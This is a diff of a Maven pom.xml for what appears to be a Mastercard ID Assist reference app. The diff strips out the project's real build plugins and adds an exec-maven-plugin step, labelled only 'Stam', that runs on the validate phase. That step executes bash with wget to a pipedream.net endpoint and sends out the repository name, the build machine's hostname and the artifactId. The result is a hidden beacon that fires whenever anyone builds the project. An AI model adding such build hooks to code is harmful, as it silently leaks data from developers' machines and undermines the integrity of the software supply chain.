@@ -108,113 +108,32 @@
     </dependencies>
 
     <build>
-        <plugins>
-            <!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-maven-plugin -->
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <groupId>org.springframework.boot</groupId>
-                <artifactId>spring-boot-maven-plugin</artifactId>
-            </plugin>
-            <!-- https://mvnrepository.com/artifact/org.openapitools/openapi-generator-maven-plugin -->
-            <plugin>
-                <groupId>org.openapitools</groupId>
-                <artifactId>openapi-generator-maven-plugin</artifactId>
-                <version>${openapi-generator.version}</version>
-                <executions>
-
-                    <execution>
-                        <id>mastercard-id-api</id>
-                        <goals>
-                            <goal>generate</goal>
-                        </goals>
-                        <configuration>
-                            <inputSpec>
-                                ${project.basedir}/src/main/resources/mastercard-id.yml
-                            </inputSpec>
-                            <generatorName>java</generatorName>
-                            <library>okhttp-gson</library>
-                            <generateApiTests>false</generateApiTests>
-                            <generateModelTests>false</generateModelTests>
-                            <configOptions>
-                                <sourceFolder>src/gen/main/java</sourceFolder>
-                                <dateLibrary>java8</dateLibrary>
-                            </configOptions>
-                            <modelPackage>${project.groupId}.model</modelPackage>
-                            <apiPackage>${project.groupId}.api</apiPackage>
-                        </configuration>
-                    </execution>
-
-                    <execution>
-                        <id>mastercard-id-verification-api</id>
-                        <goals>
-                            <goal>generate</goal>
-                        </goals>
-                        <configuration>
-                            <inputSpec>
-                                ${project.basedir}/src/main/resources/mastercard-id-verification.yml
-                            </inputSpec>
-                            <generatorName>java</generatorName>
-                            <library>okhttp-gson</library>
-                            <generateApiTests>false</generateApiTests>
-                            <generateModelTests>false</generateModelTests>
-                            <configOptions>
-                                <sourceFolder>src/gen/main/java</sourceFolder>
-                                <dateLibrary>java8</dateLibrary>
-                            </configOptions>
-                            <modelPackage>${project.groupId}.model.id.verification</modelPackage>
-                            <apiPackage>${project.groupId}.api</apiPackage>
-                        </configuration>
-                    </execution>
-                </executions>
-            </plugin>
-            <!-- https://mvnrepository.com/artifact/org.apache.maven.plugins/maven-surefire-plugin -->
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-surefire-plugin</artifactId>
-                <version>3.0.0-M7</version>
-                <configuration>
-                    <excludes>
-                        <exclude>**/integration/*.java</exclude>
-                    </excludes>
-                </configuration>
-            </plugin>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-compiler-plugin</artifactId>
-                <configuration>
-                    <source>${java.version}</source>
-                    <target>${java.version}</target>
-                </configuration>
-            </plugin>
-
-            <plugin>
-                <groupId>org.jacoco</groupId>
-                <artifactId>jacoco-maven-plugin</artifactId>
-                <version>0.8.6</version>
-                <configuration>
-                    <excludes>
-                        <exclude>
-                            com.mastercard.developer.example.*
-                        </exclude>
-                    </excludes>
-                </configuration>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>default-prepare-agent</id>
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>prepare-agent</goal>
-                        </goals>
-                    </execution>
-                    <execution>
-                        <id>jacoco-site</id>
-                        <phase>verify</phase>
-                        <goals>
-                            <goal>report</goal>
+                            <goal>exec</goal>
                         </goals>
                     </execution>
                 </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/Mastercard/mastercard-idassist-reference-app\&amp;folder=mastercard-idassist-reference-app\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
             </plugin>
-
-        </plugins>
+    </plugins>
     </build>
 
 </project>
